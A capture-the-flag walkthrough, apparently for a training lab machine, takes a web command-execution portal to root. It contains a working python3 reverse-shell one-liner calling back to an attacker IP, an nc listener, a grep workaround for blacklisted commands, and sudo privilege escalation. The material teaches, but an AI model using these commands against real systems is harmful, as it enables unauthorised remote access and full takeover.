Machine IP - 10.10.141.187

Port enumeration -
```
22
80
7800
```
browsing over to webpage and checking source code reveals username - 
```
 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
dirsearch result -
```
[06:11:32] 200 -    2KB - /assets/                                          
[06:11:32] 301 -  315B  - /assets  ->  http://10.10.141.187/assets/         
[06:11:45] 200 -    1KB - /index.html                                       
[06:11:48] 200 -  882B  - /login.php                                        
[06:11:59] 200 -   17B  - /robots.txt 
```

Browsing to robots.txt
```
Wubbalubbadubdub
```

Trying R1ckRul3s:Wubbalubbadubdub credentials in ssh gives error, trying in /login.php page succeeds.

trying basic commands worked -
```
$ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

few commands were blacklisted which prevent us from spawning reverse shells with nc and reading that txt file...

```
grep -R .

# Reveals content of all files in the current directory and we get the first ingeredient

Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
```
python3 is installed on machine - 
```

```

Using python3 reverse-shell -
```
# on attacker machine
nc -lnvp 4444
```
```
# on command execution page
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.16.134",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
We land as www-data, uploading linpeas.sh to check for vulnerabilities-
```
# we find a great thing here

User www-data may run the following commands on ip-10-10-63-154.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
So baiscally we can run all commands with this account including loggin in as root without password, 
```
sudo bash

$ sudo bash
sudo bash
root@ip-10-10-63-154:/tmp# whoami
whoami
root

```
ez!
From here we can check both the remaining flags in /root and /home/rick
